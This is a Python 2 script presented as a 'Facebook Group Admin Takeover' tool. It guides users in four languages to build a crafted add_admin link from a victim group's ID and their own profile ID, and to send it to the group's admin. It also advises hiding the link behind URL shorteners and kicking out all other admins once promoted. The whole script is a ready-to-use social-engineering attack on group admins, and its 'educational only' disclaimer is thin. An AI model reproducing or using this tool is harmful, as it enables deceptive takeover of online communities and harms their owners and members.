import os, sys, time


# Set Colors ######

N = '\033[0m'

W = '\033[1;97m'

B = '\033[1;94m'

R = '\033[1;91m'

G = '\033[1;92m'

Y = '\033[1;93m'

C = '\033[1;96m'

M = '\033[1;95m'

Gr = '\033[1;98m'

abs = '\033[48;5;0;38;5;197m'

##################


# Restart ####################

def restart_program():

   python = sys.executable

   os.execl(python, python, * sys.argv)

   curdir = os.getcwd()

##############################


os.system("clear")
print "%s                         __    _                                   %s" % (G, N)
print '%s                    _wr""        "-q__                             %s' % (G, N)
print "%s                 _dP                 9m_     %s" % (G, N)
print "%s               _#P                     9#_                         %s" % (G, N)
print "%s              d#@                       9#m                        %s" % (G, N)
print '%s             d##                         ###                       %s' % (G, N)
print '%s            J###                         ###L                      %s' % (G, N)
print "%s            {###K                       J###K                      %s" % (G, N)
print "%s            ]####K      ___aaa___      J####F                      %s" % (G, N)
print "%s        __gmM######_  w#P""   ""9#m  _d#####Mmw__                  %s" % (G, N)
print "%s     _g##############mZ_         __g##############m_               %s" % (G, N)
print "%s   _d####M@PPPP@@M#######Mmp gm#########@@PPP9@M####m_             %s" % (G, N)
print '%s  a###""          ,Z"#####@" "######"\g          ""M##m  %s' % (G, N)          
print '%s J#@"             0L  "*##     ##@"  J#              *#K    %s' % (G, N)       
print '%s #"               `#    "_gmwgm_~    dF               `#_          %s' % (G, N)
print '%s7F                 "#_   ]#####F   _dK                 JE          %s' % (G, N)
print '%s]                    *m__ ##### __g@"                   F          %s' % (G, N)
print '%s                       "PJ#####LP"                                 %s' % (G, N)
print "%s `                       0######_                      '           %s" % (G, N)
print "%s                       _0########_                                   %s" % (G, N)
print "%s     .               _d#####^#####m__              ,              %s" % (G, N)
print '%s      "*w_________am#####P"   ~9#####mw_________w*"                  %s' % (G, N)
print '%s          ""9@#####@M""           ""P@#####@M""                    %s' % (G, N)
print "\n"

print "%s  ____ ___ %s" % (G, N)

print "%s / __// o.) %s.__ %s . . . %s" % (G, W, C, N)

print "%s / _/ / o \ %s[ __._._ . .[_) %s|_| _. _.;_/ %s" % (G, W, R, N)

print "%s /_/ /___,' %s[_./[ (_)(_||  %s | |(_](_.| \ %s" % (G, W, R, N)
print "\n"
print " %s========================%s|%s======================%s " % (C, B, C, N)
print "\n"
print " %sFacebook%s Group%s Admin Takeover %s25-03-2020%s (0:55)%s" % (B, W, R, C, Y, N)
print "\n"
print " %sDeveloped by: %sITALIA CYBER ARMY %s$$$%s And The Great %sAsif Javes%s Thank You!%s" % (abs, R, G, Y, M, Y, N)
print "\n"
print " %sTelegram:  %st.me/termuxx_hacking%s" % (C, G, N)
print "\n"
print " %sCode Language: %sPython%s" % (M, C, N)
print "\n"
print " %sAuthor Codemaster: %sErr0r%s" % (W, abs, N)
print "\n"
print " %sInstagram: %s@termux_hacking %sFollow and Like%s" % (Y, B, G, N)
print "\n"
print " %sThis Purpose is For Educational %sONLY%s" % (C, R, N)
print "\n"
print " %sWE Take %sNO%s Responsibilities For The Use of This%s" % (Y, R, Y, N)
print "\n"
print " %sEnjoy the Program and Stay Safe%s" % (G, N)
print "\n"
print "%s ===================================================%s" % (C, N)
print "\n"
print "\n"

print " %sLanguage/Bahasa:%s" % (abs, N)

print "\n"

print "%s (%s01%s)%s -- %sIndonesia%s" % (B, C, B, Y, G, N)
print "\n"
print "%s (%s02%s)%s -- %sEnglish%s" % (B, C, B, Y, G, N)
print "\n"
print "%s (%s03%s)%s -- %sTetum%s" % (B, C, B, Y, G, N)
print "\n"
print "%s (%s04%s)%s -- %sItaliano%s" % (B, C, B, Y, G, N) 
print "\n"
print "\n"
bahasa = raw_input("%s[%s*%s] %sPilih/Choose/Hili/Seleziona:%s " % (C, Y, C, W, B))


try:

	file = open("link.txt", 'w')

except(IOError):

	print "ERROR"

	sys.exit()


if bahasa.strip() in "01 1".split():

  print " %s[%s Indonesia%s ]%s" % (R, W, R, N)

  print

  tahap1 = raw_input("%s1%s)%s Pertama cari grup di%s facebook%s yang ingin kamu%s hack%s...%s[%sEnter%s]%s" % (Y, C, W, B, W, R, W, C, Y, C, N))

  print "%s--------------------%s" % (R, N)

  tahap2 = raw_input("%s2%s)%s Setelah itu klik url grupnya dan salin 15 digit kode ajaib grup. Contoh punya grup %sADM%s (%s 589101351254979%s )%s...%s[%sEnter%s]%s" % (Y, C, W, R, C, B, C, W, C, Y, C, N))

  print "%s--------------------%s" % (R, N)

  tahap3 = raw_input("%s3%s)%s Sekarang masuk ke profilmu dan cari 15 digit kode profilmu. Contoh punya%s saya %s(%s 100004136748473 %s)%s...%s[%sEnter%s]%s" % (Y, C, W, R, C, B, C, W, C, Y, C, N))

  print "%s--------------------%s" % (R, N)

  tahap4 = raw_input("%s4%s)%s Bila anda kesusahan mendapatkan kode 15 digit tersebut. Coba masuk lewat browser bawaan...%s[%sEnter%s]%s" % (Y, C, W, C, Y, C, N))

  print "%s--------------------%s" % (R, N)

  tahap5 = raw_input("%s5%s)%s Setelah menemukan kode grup korban dan kode profil anda. Kita mulai %spenggabungan kode%s...%s[%sEnter%s]%s" % (Y, C, W, R, W, C, Y, C, N))

  grup = raw_input(" %s(%sa%s)%s Kode Grup%s >>>%s " % (W, C, W, C, R, Y))

  anda = raw_input(" %s(%sb%s)%s Kode Anda%s >>>%s " % (W, C, W, C, R, Y))

  print " %s(%s*%s)%s Hasil%s >>> %shttps://m.facebook.com/group/add_admin/?group_id=%s&user_id=%s&added&_rdrChange%s" % (C, Y, C, W, R, B, grup, anda, N)

  file.write("https://m.facebook.com/group/add_admin/?group_id=%s&user_id=%s&added&_rdrChange" % (grup, anda))

  print "%s--------------------%s" % (R, N)

  tahap6 = raw_input("%s6%s)%s Sekarang salin link hasil gabungan tersebut lalu kirimkan ke %sadmin%s. Bila anda kesusahan untuk menyalinnya, saya sudah menyimpan linknya dalam file *link.txt*. Jadi anda tinggal masuk ke file link.txt lalu menyalin linknya dan mengirimkannya ke %sadmin%s...%s[%sEnter%s]%s" % (Y, C, W, R, W, R, W, C, Y, C, N))

  print "%s--------------------%s" % (R, N)

  tahap7 = raw_input("%s7%s)%s Anda tinggal menunggu hingga linknya diklik oleh si %sadmin%s grup...%s[%sEnter%s]%s" % (Y, C, W, R, W, C, Y, C, N))

  print "%s--------------------%s" % (R, N)

  tahap8 = raw_input("%s8%s)%s Bila anda sudah menerima pemberitahuan bahwa anda sudah diangkat sebagai %sadmin%s, anda harus dengan cepat menendang semua %sadmin%s yang lain digrup tersebut sebelum %sadmin%s yang lain sadar dan menendang anda keluar...%s[%sEnter%s]%s" % (Y, C, W, R, W, R, W, R, W, C, Y, C, N))

  print "%s--------------------%s" % (R, N)

  tahap9 = raw_input("%s9%s)%s Sekarang bersenang-senanglah %s:)%s...%s[%sEnter%s]%s" % (Y, C, W, Y, W, C, Y, C, N))

  print "%s[%s#%s]%s ------------------%s Selesai %s------------------ %s[%s#%s]%s" % (C, Y, C, B, W, R, C, Y, C, N)

  print

  time.sleep(1)

  print "%s*catatan:admin yang pintar dan cerdik akan segera mengetahui link yang anda kirimkan hanya dengan melihat link tersebut, jadi kami menyarankan anda untuk menggunakan shortlink untuk memyamarkan link tersebut. Gunakan goo.gl atau bit.ly dll*%s" % (Y, N)

  time.sleep(1)

  print "%sTerima kasih%s telah bersedia menggunakan %sprogram saya%s %s:')%s" % (C, W, R, W, Y, N)

  time.sleep(1)

  print "%sSampai Jumpa %s:)%s" % (W, Y, N)

  sys.exit()


elif bahasa.strip() in "02 2".split():

  print "%s [%s English%s ]%s" % (C, W, C, N)

  print

  step1 = raw_input("%s1%s)%s First Of All Go To The %sFacebook%s Group That You Want To %sHack%s...%s[%sEnter%s]%s" % (Y, C, W, B, W, R, W, C, Y, C, N))

  print "%s--------------------%s" % (R, N)

  step2 = raw_input("%s2%s)%s After That. Go Click On The Group Url And Then Copy 15 Digits Group Magical Code. Example %s(%s 589101351254979 %s)%s...%s[%sEnter%s]%s" % (Y, C, W, C, B, C, W, C, Y, C, N))

  print "%s--------------------%s" % (R, N)

  step3 = raw_input("%s3%s)%s Now Go To Your Profile And Find Your 15 Digits Profile Code. Example %s(%s 100004136748473 %s)%s...%s[%sEnter%s]%s" % (Y, C, W, C, B, C, W, C, Y, C, N))

  print "%s--------------------%s" % (R, N)

  step4 = raw_input("%s4%s)%s If the url didnt show that 15 digit code. Then try to open %sfacebook%s from the browser...%s[%sEnter%s]%s" % (Y, C, W, B, W, C, Y, C, N))

  print "%s--------------------%s" % (R, N)

  step5 = raw_input("%s5%s)%s After Find Both Codes..%sLet we mix it up%s...%s[%sEnter%s]%s" % (Y, C, W, R, W, C, Y, C, N))

  group = raw_input(" %s(%sa%s)%s Group Code%s >>>%s " % (W, C, W, C, R, Y))

  you = raw_input(" %s(%sb%s)%s Your Code%s >>>%s " % (W, C, W, C, R, Y))

  print " %s(%s*%s)%s Result%s >>>%s https://m.facebook.com/group/add_admin/?group_id=%s&user_id=%s&added&_rdrChange%s" % (C, Y, C, W, R, B, group, you, N)

  file.write("https://m.facebook.com/group/add_admin/?group_id=%s&user_id=%s&added&_rdrChange" % (group, you))

  print "%s--------------------%s" % (R, N)

  step6 = raw_input("%s6%s)%s Now Copy The Link On The Result And Then Send Copied Link To %sAdmin%s Of The Group. If Its Hard To You To Copy The Link, I Have Save The Link On File *link.txt*. So Its Getting Easier, Just Open The File link.txt And Then Copy The Link Then Send To The %sAdmin%s...%s[%sEnter%s]%s" % (Y, C, W, R, W, R, W, C, Y, C, N))

  print "%s--------------------%s" % (R, N)

  step7 = raw_input("%s7%s)%s You Just Need To Wait Till The %sAdmin%s Click On The Link that You Send. Then You Will Be %sAdmin%s Of The Group...%s[%sEnter%s]%s" % (Y, C, W, R, W, R, W, C, Y, C, N))

  print "%s--------------------%s" % (R, N)

  step8 = raw_input("%s8%s)%s Now Don't Waste Your Time. Go To Group Settings And Remove All %sAdmins%s From The Group...%s[%sEnter%s]%s" % (Y, C, W, R, W, C, Y, C, N))

  print "%s--------------------%s" % (R, N)

  step9 = raw_input("%s9%s)%s Have Fun %s:)%s...%s[%sEnter%s]%s" % (Y, C, W, Y, W, C, Y, C, N))

  print "%s[%s#%s]%s -------------------%s Done %s-------------------- %s[%s#%s]%s" % (C, Y, C, B, W, R, C, Y, C, N)

  print

  time.sleep(1)

  print "%s*note:clever admin can notice the link just by one blink. So i suggest you to use shortlink like goo.gl or bit.ly etc*%s" % (Y, N)

  time.sleep(1)

  print "%sThanks%s For %sUsing My Program%s %s:')%s" % (C, W, R, W, Y, N)

  time.sleep(1)

  print "%sGood Bye %s:)%s" % (W, Y, N)


elif bahasa.strip() in "03 3".split():

  print " %s[%s Tetum%s ]%s" % (R, W, R, N)

  print

  tahap1 = raw_input("%s1%s)%s Primeiro, buka grupo iha%s facebook%s neebe ita boot atu%s hack%s...%s[%sEnter%s]%s" % (Y, C, W, B, W, R, W, C, Y, C, N))

  print "%s--------------------%s" % (R, N)

  tahap2 = raw_input("%s2%s)%s Depois klik url grupo nian no kopia 15 digit kode grupo. Exemplo kode grupo %sADM%s (%s 589101351254979%s )%s...%s[%sEnter%s]%s" % (Y, C, W, R, C, B, C, W, C, Y, C, N))

  print "%s--------------------%s" % (R, N)

  tahap3 = raw_input("%s3%s)%s Agora tama ba ita boot nia profil no buka 15 digit kode profil ita boot nian. Exemplo%s hau nian %s(%s 100004136748473 %s)%s...%s[%sEnter%s]%s" % (Y, C, W, R, C, B, C, W, C, Y, C, N))

  print "%s--------------------%s" % (R, N)

  tahap4 = raw_input("%s4%s)%s Kuando susar ba ita boot atu buka kode 15 digit nee. Koko loke husi browser neebe prepara tia ona husi telfoni...%s[%sEnter%s]%s" % (Y, C, W, C, Y, C, N))

  print "%s--------------------%s" % (R, N)

  tahap5 = raw_input("%s5%s)%s Depois ita boot hetan ona kode grupo nian no ita boot nian kode profile. Mai ita komesa tama sessaun %sgabung kode%s...%s[%sEnter%s]%s" % (Y, C, W, R, W, C, Y, C, N))

  grup = raw_input(" %s(%sa%s)%s Kode Grupo nian%s >>>%s " % (W, C, W, C, R, Y))

  ita = raw_input(" %s(%sb%s)%s Kode Ita boot nian%s >>>%s " % (W, C, W, C, R, Y))

  print " %s(%s*%s)%s Rezultado%s >>> %shttps://m.facebook.com/group/add_admin/?group_id=%s&user_id=%s&added&_rdrChange%s" % (C, Y, C, W, R, B, grup, ita, N)

  file.write("https://m.facebook.com/group/add_admin/?group_id=%s&user_id=%s&added&_rdrChange" % (grup, ita))

  print "%s--------------------%s" % (R, N)

  tahap6 = raw_input("%s6%s)%s Agora kopia link rezultado neebe ita gabung no send ba %sadmin%s. Kuando susar ba ita boot atu kopia link nee, hau simpan tia ona link nee iha file *link.txt*. Entaun ita boot hela loke file link.txt no kopia link nee no send ba %sadmin%s...%s[%sEnter%s]%s" % (Y, C, W, R, W, R, W, C, Y, C, N))

  print "%s--------------------%s" % (R, N)

  tahap7 = raw_input("%s7%s)%s Ita boot hela hein too link nee %sadmin%s klik...%s[%sEnter%s]%s" % (Y, C, W, R, W, C, Y, C, N))

  print "%s--------------------%s" % (R, N)

  tahap8 = raw_input("%s8%s)%s Kuando ita boot hetan notifikasaun neebe dehan katak ita boot sai ona %sadmin%s, ita boot tenki lalais tebe %sadmin%s hotu iha grupo antes %sadmin%s seluk tebe uluk ita boot...%s[%sEnter%s]%s" % (Y, C, W, R, W, R, W, R, W, C, Y, C, N))

  print "%s--------------------%s" % (R, N)

  tahap9 = raw_input("%s9%s)%s Agora ita boot bele manda grupo ho kontenti %s:)%s...%s[%sEnter%s]%s" % (Y, C, W, Y, W, C, Y, C, N))

  print "%s[%s#%s]%s ------------------%s Remata %s------------------ %s[%s#%s]%s" % (C, Y, C, B, W, R, C, Y, C, N)

  print

  time.sleep(1)

  print "%s*nota:admin neebe matenek sei nota link ida ita boot send ba nia nee sei lori perigu ba nia, entaun ita boot tenki shortlink link nee ho goo.gl atau bit.ly etc*%s" % (Y, N)

  time.sleep(1)

  sys.exit()


elif bahasa.strip() in "04 4".split():

  print "%s [%s Italiano%s ]%s" % (C, W, C, N)

  print

  step1 = raw_input("%s1%s)%s Prima di Tutto Apri il Gruppo %sFacebook%s Nel Quale se Desidera Effettuare l %sHack%s...%s[%sEnter%s]%s" % (Y, C, W, B, W, R, W, C, Y, C, N))

  print "%s--------------------%s" % (R, N)

  step2 = raw_input("%s2%s)%s Successivamente, Cliccare Sull URL Del Gruppo e Trascrivere l ID di 15 Cifre. Esempio %s(%s 589101351254979 %s)%s...%s[%sEnter%s]%s" % (Y, C, W, C, B, C, W, C, Y, C, N))

  print "%s--------------------%s" % (R, N)

  step3 = raw_input("%s3%s)%s Ora Vai Sul Tuo Profilo e Trascrivi il Tuo ID di 15 Cifre. Esempio %s(%s 100004136748473 %s)%s...%s[%sEnter%s]%s" % (Y, C, W, C, B, C, W, C, Y, C, N))

  print "%s--------------------%s" % (R, N)

  step4 = raw_input("%s4%s)%s Se l URL Non Mostra le 15 Cifre Del Codice, Allora Prova ad Aprire %sFacebook%s Dal Tuo Browser (Google Chrome) ...%s[%sEnter%s]%s" % (Y, C, W, B, W, C, Y, C, N))

  print "%s--------------------%s" % (R, N)

  step5 = raw_input("%s5%s)%s Dopo Aver Trascritto Entrambi i Codici..%s Lasciaci Eseguire la Magia%s...%s[%sEnter%s]%s" % (Y, C, W, R, W, C, Y, C, N))

  group = raw_input(" %s(%sa%s)%s ID Gruppo Target%s >>>%s " % (W, C, W, C, R, Y))

  you = raw_input(" %s(%sb%s)%s ID Personale%s >>>%s " % (W, C, W, C, R, Y))

  print " %s(%s*%s)%s Risultato%s >>>%s https://m.facebook.com/group/add_admin/?group_id=%s&user_id=%s&added&_rdrChange%s" % (C, Y, C, W, R, B, group, you, N)

  file.write("https://m.facebook.com/group/add_admin/?group_id=%s&user_id=%s&added&_rdrChange" % (group, you))

  print "%s--------------------%s" % (R, N)

  step6 = raw_input("%s6%s)%s Adesso Copia l URL di Output e Invialo All %sAdmin%s Del Gruppo Target. Se ti Rimane Difficile Copiare il Link, L ho Salvato Nel File *link.txt*. Giusto Per  Semplificare la Cosa, Apri il File link.txt Copia Il Link e Invialo All %sAdmin%s...%s[%sEnter%s]%s" % (Y, C, W, R, W, R, W, C, Y, C, N))

  print "%s--------------------%s" % (R, N)

  step7 = raw_input("%s7%s)%s Resta Solo da Aspettare Che l %sAdmin%s Clicchi Sul Link Appena Inviato. Dopodiche, TU Rimpiazzerai il Corrente %sAdmin%s Del Gruppo...%s[%sEnter%s]%s" % (Y, C, W, R, W, R, W, C, Y, C, N))

  print "%s--------------------%s" % (R, N)

  step8 = raw_input("%s8%s)%s Adesso Non c'e Tempo da Perdere. Vai Sulle Impostazioni Del Gruppo e Rimuovi Tutti Gli %sAdmins%s e Moderatori Dal Gruppo...%s[%sEnter%s]%s" % (Y, C, W, R, W, C, Y, C, N))

  print "%s--------------------%s" % (R, N)

  step9 = raw_input("%s9%s)%s Divertitevi %s:)%s...%s[%sEnter%s]%s" % (Y, C, W, Y, W, C, Y, C, N))

  print "%s[%s#%s]%s -------------------%s Fatto %s-------------------- %s[%s#%s]%s" % (C, Y, C, B, W, R, C, Y, C, N)

  print

  time.sleep(1)

  print "%s*Nota: Un Admin Preparato Saprebbe Riconoscere la Trappola Nell URL. Vi Suggerisco, Quindi, di Ricorrere Agli URL Shortener Tipo goo.gl o bit.ly etc*%s" % (Y, N)

  time.sleep(1)

  print "%sGrazie%s Per %sAver Usato il Mio Programma%s %s:')%s" % (C, W, R, W, Y, N)

  time.sleep(1)

  print "%sArrivederci %s:)%s" % (W, Y, N)

else:

	print

	print "%s[%si%s]%s Anda Memasukkan Perintah Yang Salah%s" % (Y,R,Y,W,N)

	print "%s[%si%s]%s Wrong Input%s" % (Y,R,Y,W,N)

	print "%s[%si%s]%s Ita Boot Manda Sala%s" % (Y,R,Y,W,N)

        print "%s[%si%s]%s Comando Errato%s" % (Y,R,Y,W,N)

	time.sleep(2)

	restart_program()

